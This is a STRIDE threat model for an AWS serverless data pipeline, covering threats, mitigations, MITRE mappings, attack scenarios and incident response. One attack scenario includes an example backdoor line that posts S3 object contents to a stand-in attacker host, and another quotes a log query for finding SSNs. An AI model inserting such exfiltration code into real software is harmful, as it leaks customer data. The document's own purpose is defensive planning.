# Threat Model (STRIDE)

## Assets
- **Data:** Raw files (S3 raw bucket), processed files (S3 processed bucket), ETL metadata (DynamoDB), DLQ messages
- **Compute:** Lambda function code, Step Functions state machine definitions, execution state
- **Secrets:** KMS encryption keys, IAM role credentials, API tokens in Secrets Manager, S3 bucket encryption keys
- **Infrastructure:** S3 buckets, DynamoDB tables, Lambda functions, Step Functions state machines, VPC endpoints, CloudWatch logs
- **Code:** Lambda handler source code, Step Functions ASL definitions, SAM/CloudFormation templates

## Entry Points
- **External:** S3 upload endpoint (PutObject API), EventBridge rules triggered by S3 events
- **Internal:** Lambda function invocations, Step Functions API (StartExecution), DynamoDB read/write, Secrets Manager GetSecretValue
- **Human:** AWS Console access (admin users), AWS CLI/SDK (automation scripts), CI/CD pipelines (GitHub Actions)
- **Logging:** CloudWatch Logs ingestion, CloudTrail event delivery

## Threats & Mitigations

### Spoofing (Identity)
| Threat | Impact | Mitigation | Residual Risk |
|--------|--------|------------|---------------|
| Unauthorized S3 upload to raw bucket | High - Malicious data injection, pipeline poisoning | Bucket policy restricts PutObject to specific IAM roles (upstream producer), MFA delete enabled, versioning on | Low (with proper role assumption) |
| Impersonation of Lambda execution role | Critical - Full pipeline access, data exfiltration | Short-lived STS credentials via IAM role assumption, no long-term access keys, CloudTrail logs all AssumeRole calls | Medium (stolen session token risk) |
| Forged EventBridge events triggering workflows | High - Resource exhaustion, cost spike | EventBridge rule pattern validation (only aws.s3 source), resource-based policy on Step Functions restricts invocation to EventBridge | Low |
| Unauthorized access to Secrets Manager | Critical - API token theft, external system compromise | IAM policy restricts GetSecretValue to specific Lambda roles, secret rotation enabled (90 days), VPC endpoint for in-VPC access | Low |

**MITRE Mapping:** T1078 (Valid Accounts), T1550 (Use Alternate Authentication Material)

### Tampering (Integrity)
| Threat | Impact | Mitigation | Residual Risk |
|--------|--------|------------|---------------|
| Malicious code injection in Lambda function | Critical - Arbitrary execution, data tampering | Code review required for all PRs, SAM template validation, signed commits (git commit -S), immutable Lambda versions | Low (supply chain risk remains) |
| Modification of Step Functions state machine | High - Workflow bypass, data skipped | CloudFormation change sets require approval, IAM policy restricts UpdateStateMachine to CI/CD role, Git-based source of truth | Low |
| Tampering with processed files in S3 | High - Data integrity violation, downstream corruption | S3 Object Lock (WORM mode) for compliance, versioning enabled, CloudTrail logs PutObject/DeleteObject with user identity | Medium (admin override possible) |
| DynamoDB metadata manipulation | Medium - Misleading audit trail | DynamoDB table has delete protection, IAM least privilege (Lambda write-only to specific items), point-in-time recovery enabled | Low |
| Man-in-the-middle attack on S3/DynamoDB traffic | High - Data interception/modification | TLS 1.2+ enforced via bucket policy (`aws:SecureTransport: true`), VPC endpoints with endpoint policies, no public internet routing | Low |

**MITRE Mapping:** T1565 (Data Manipulation), T1195.002 (Supply Chain Compromise), T1557 (MITM)

### Repudiation (Non-repudiation)
| Threat | Impact | Mitigation | Residual Risk |
|--------|--------|------------|---------------|
| Untracked Lambda deployment | Medium - Compliance violation, no audit trail | All deployments via CloudFormation (logged to CloudTrail), SAM changeset preview before apply, Git SHA tagged on Lambda resources | Low |
| Unattributed S3 file upload | High - Cannot trace malicious data source | CloudTrail S3 data events enabled (logs user, IP, timestamp for PutObject), S3 access logs to audit bucket (90-day retention) | Low |
| Deleted CloudWatch Logs (cover tracks) | High - Incident forensics impaired | Log retention enforced (30 days for debug, 365 days for audit), log deletion restricted via IAM policy (Deny DeleteLogGroup), logs exported to S3 for long-term storage | Low |

**MITRE Mapping:** T1070 (Indicator Removal on Host), T1562.008 (Disable Cloud Logs)

### Information Disclosure (Confidentiality)
| Threat | Impact | Mitigation | Residual Risk |
|--------|--------|------------|---------------|
| PII leakage in CloudWatch Logs | Critical - GDPR/CCPA violation, privacy breach | Log sanitization in Lambda code (redact PII via regex before logging), CloudWatch Logs encrypted with KMS CMK, access restricted to SecOps team | Medium (developer logging PII accidentally) |
| Exposed S3 bucket (public access) | Critical - Data breach, intellectual property theft | S3 Block Public Access enabled at account level, bucket policy denies public access, bucket encryption with KMS, IAM Access Analyzer monitors for public buckets | Low |
| KMS key exfiltration | Critical - Decrypt all data at rest | KMS key policy restricts use to specific roles, key rotation enabled annually, CloudTrail logs Decrypt/Encrypt API calls, key deletion requires 30-day waiting period | Low |
| Secrets Manager secret exposed in code | High - API token compromise, third-party access | Secret scanning in CI (TruffleHog, detect-secrets), Secrets Manager SDK used at runtime (not environment variables), pre-commit hooks block secrets in commits | Medium (human error) |
| Lambda environment variable exposure | Medium - Config leak, potential sensitive data | Environment variables encrypted with KMS, no secrets stored in env vars (use Secrets Manager), Lambda function code not publicly accessible | Low |

**MITRE Mapping:** T1530 (Data from Cloud Storage), T1552.001 (Credentials in Files), T1552.005 (Cloud Instance Metadata API)

### Denial of Service (Availability)
| Threat | Impact | Mitigation | Residual Risk |
|--------|--------|------------|---------------|
| S3 event flooding (event loop) | Critical - Pipeline outage, runaway costs, account throttling | EventBridge rule rate limiting (max 1000 events/sec), CloudWatch alarm on ExecutionsStarted spike (>500/min), auto-disable rule via Lambda if threshold breached | Medium (misconfiguration risk) |
| Lambda concurrent execution exhaustion | High - Processing halted, SLA breach | Reserved concurrency per function (limits blast radius), account limit increase requested (default 1000 → 5000), DLQ for dropped events | Low |
| DynamoDB throttling (write capacity exceeded) | High - Metadata writes fail, executions hang | DynamoDB on-demand billing (auto-scales to handle spikes), retry logic with exponential backoff in Lambda, CloudWatch alarm on ThrottledRequests | Low |
| Step Functions execution quota exceeded | Medium - New workflows rejected | Step Functions quota: 1M concurrent executions (soft limit), CloudWatch alarm at 80% utilization, request limit increase if needed | Low |
| Malicious large file upload (>5GB) | Medium - Lambda OOM, processing timeout | S3 bucket lifecycle rule rejects files >500MB (PutObject denied via bucket policy size condition), Lambda validates file size before processing | Low |

**MITRE Mapping:** T1499 (Endpoint DoS), T1496 (Resource Hijacking), T1498.001 (Direct Network Flood)

### Elevation of Privilege (Authorization)
| Threat | Impact | Mitigation | Residual Risk |
|--------|--------|------------|---------------|
| Lambda escapes container to EC2 host | Critical - Full AWS account compromise | Lambda runs on AWS-managed infrastructure (no container escape in standard Lambda), AWS Firecracker VM isolation, no privileged Lambda execution | Low (AWS responsibility) |
| IAM role privilege escalation | High - Unauthorized access to other AWS resources | Least privilege IAM policies (no wildcard `*` actions), IAM Access Analyzer detects overly permissive policies, quarterly IAM policy review | Medium (complex policies risk over-permission) |
| Step Functions invokes unauthorized Lambda | High - Bypass validation/transform steps | Step Functions state machine definition restricts Lambda ARNs (no dynamic selection), CloudFormation enforces ARN references, resource-based policies on Lambdas | Low |
| Compromised dependency (supply chain) | Critical - Backdoor in Lambda runtime | Dependency pinning in `requirements.txt`, Snyk/Dependabot vulnerability scanning, Lambda layer signatures (Cosign), SBOM generation | Medium (zero-day in numpy/pandas) |
| CloudFormation stack policy bypass | High - Delete production resources | Stack termination protection enabled for prod stacks, IAM policy denies DeleteStack for prod, CloudFormation drift detection monthly | Low |

**MITRE Mapping:** T1611 (Escape to Host), T1068 (Privilege Escalation), T1195.001 (Supply Chain - Compromise Software Dependencies)

---

## Attack Scenarios

### Scenario 1: S3 Event Loop (Runaway Costs)

**Attacker Goal:** Cause financial damage via resource exhaustion and AWS bill shock.

**Attack Path:**
1. Attacker gains limited S3 write access to processed bucket (e.g., compromised upstream role)
2. Misconfiguration: EventBridge rule triggers on both raw AND processed bucket uploads
3. Output Lambda writes file to processed bucket
4. EventBridge triggers new Step Functions execution
5. Loop repeats exponentially (1 → 2 → 4 → 8 → ...), creating thousands of executions per second
6. AWS bill spikes to $10,000+ within hours (Lambda invocations, Step Functions state transitions, S3 API calls)

**Mitigations:**
- [x] EventBridge rule pattern restricts to `raw-data-bucket` ONLY (excludes processed bucket)
- [x] CloudWatch alarm: ExecutionsStarted >500 in 1 minute → PagerDuty + auto-disable rule
- [x] AWS Budgets alert at 200% of monthly budget → SNS to FinOps
- [x] S3 bucket policy on processed bucket denies PutObject from untrusted roles
- [ ] Implement circuit breaker: Lambda checks DynamoDB counter, aborts if >1000 executions in 5 min

**Detection:** CloudWatch metrics show exponential ExecutionsStarted growth; Cost Explorer shows anomalous Lambda/Step Functions charges; EventBridge rule logs show same object key repeatedly.

**Response:** Disable EventBridge rule immediately (`aws events disable-rule`), stop all running executions, review event pattern configuration, deploy fix, re-enable with monitoring.

---

### Scenario 2: PII Leakage in CloudWatch Logs

**Attacker Goal:** Exfiltrate customer PII for identity theft or extortion.

**Attack Path:**
1. Developer adds debug logging to Lambda function: `logger.info(f"Processing user: {user_data}")`
2. `user_data` contains PII (name, email, SSN, credit card number)
3. Logs written to CloudWatch Logs (unencrypted by default if KMS not enabled)
4. Attacker with CloudWatch Logs read access (e.g., compromised developer credentials or overly permissive IAM role) queries logs
5. Extracts PII via CloudWatch Logs Insights query: `fields @timestamp, @message | filter @message like /SSN/`
6. Exfiltrates PII dataset, sells on dark web

**Mitigations:**
- [x] CloudWatch Logs encrypted with KMS CMK (key policy restricts decrypt to SecOps team)
- [x] IAM policy restricts CloudWatch Logs read access to security team only (developers no access to prod logs)
- [ ] Implement log sanitization library (redact PII regex patterns before logging)
- [x] Secret scanning in CI (TruffleHog) detects accidental secrets/PII in code
- [ ] Quarterly audit of CloudWatch Logs for PII patterns (automated scan)
- [x] Data classification policy: PII must never be logged, even in dev environments

**Detection:** CloudTrail logs excessive CloudWatch Logs GetLogEvents API calls from unusual IP; DLP tool (Macie) scans logs for PII patterns; security team reviews audit findings.

**Response:** Rotate KMS key to prevent further decryption, delete affected log streams, notify privacy/legal team, investigate attacker identity via CloudTrail, implement compensating controls (MFA for CloudWatch access).

---

### Scenario 3: Malicious Lambda Deployment via Compromised CI/CD

**Attacker Goal:** Deploy backdoored Lambda function to exfiltrate data or pivot to other AWS resources.

**Attack Path:**
1. Attacker compromises GitHub Actions secret (AWS credentials for CI/CD deployment)
2. Submits malicious PR with Lambda code containing backdoor: `requests.post("https://attacker.com/exfil", data=s3_object_content)`
3. PR bypasses code review (e.g., approved by compromised maintainer account or automated approval bot)
4. GitHub Actions runs `sam deploy`, publishing new Lambda version
5. Backdoored Lambda processes files, exfiltrates data to attacker-controlled server
6. Attacker gains access to raw data, metadata, and potentially pivots to DynamoDB/S3

**Mitigations:**
- [x] Branch protection: Require 2 approvals for PRs to main, no self-approval
- [x] Signed commits required (git commit -S with GPG key)
- [x] CI/CD role has least privilege (can deploy Lambda but not modify IAM policies)
- [ ] SAST scanning in CI (Bandit, Semgrep) detects suspicious network calls
- [x] Lambda egress restricted via security group (VPC Lambda with no internet access via NAT Gateway)
- [x] AWS Config rule detects Lambda function code changes, alerts on unauthorized modification
- [ ] Require manual approval for production deployments (human gate after CI passes)

**Detection:** AWS Config detects Lambda function code SHA change without corresponding Git commit; VPC Flow Logs show Lambda attempting outbound connection to unknown IP; security team reviews PR history and detects suspicious approver.

**Response:** Revert Lambda to previous version immediately, revoke compromised GitHub credentials, conduct forensic analysis of Lambda execution logs (CloudWatch Logs, X-Ray traces), rotate all secrets, post-incident review of CI/CD security controls.

---

## Residual Risk Summary

**High:**
- **Insider threat with IAM admin access:** Can bypass most controls (delete encryption, disable logging); mitigated by multi-person approval, CloudTrail monitoring, least privilege

**Medium:**
- **Supply chain attack via compromised dependency:** numpy/pandas vulnerability exploited in Lambda runtime; mitigated by dependency scanning, rapid patching, consider vendor vetting
- **Accidental PII logging:** Developer mistakes leading to privacy breach; mitigated by training, log sanitization, DLP scanning, but human error persists
- **S3 event loop from misconfiguration:** Despite controls, complex EventBridge rules can create loops; mitigated by testing, circuit breakers, cost alerts

**Low:**
- **External attacker gaining AWS account access:** MFA enforced, IAM least privilege, CloudTrail monitored; requires credential compromise unlikely with current controls
- **Data tampering in transit:** TLS enforced, VPC endpoints used; MITM attack surface minimal

---

## Monitoring & Response

**SIEM Integration:**
- Forward CloudTrail logs to SIEM (Splunk/ELK/Sumo Logic) for correlation
- Use cases: Detect unusual API call patterns (e.g., GetObject spike from single IP), unauthorized IAM role assumption, S3 bucket policy changes

**Anomaly Detection:**
- AWS GuardDuty enabled for threat detection (credential compromise, unusual API activity)
- CloudWatch Anomaly Detection for metrics (ExecutionsStarted, Lambda invocations) to detect event loops or DDoS

**Incident Response Playbook:**
1. **Detect:** CloudWatch alarm fires or GuardDuty finding
2. **Contain:** Disable EventBridge rule, stop Step Functions executions, revoke suspect IAM credentials
3. **Investigate:** Review CloudTrail logs, VPC Flow Logs, Lambda execution traces (X-Ray)
4. **Eradicate:** Revert to known-good state (rollback Lambda version, restore S3 from versioning)
5. **Recover:** Re-enable pipeline with enhanced monitoring
6. **Lessons Learned:** Post-incident review within 72 hours, update threat model and runbooks

**Threat Intelligence:**
- Subscribe to AWS Security Bulletins for Lambda/Step Functions CVEs
- Monitor OWASP Serverless Top 10 for emerging attack patterns
- Quarterly threat modeling review with security team

---

## Review Cadence

- **Quarterly:** Threat model review with security team, update attack scenarios based on incidents/near-misses
- **Annually:** Full STRIDE analysis, penetration testing of S3 upload → processed output flow
- **Ad-hoc:** Update after major architecture changes (new data source, external API integration, multi-region replication)
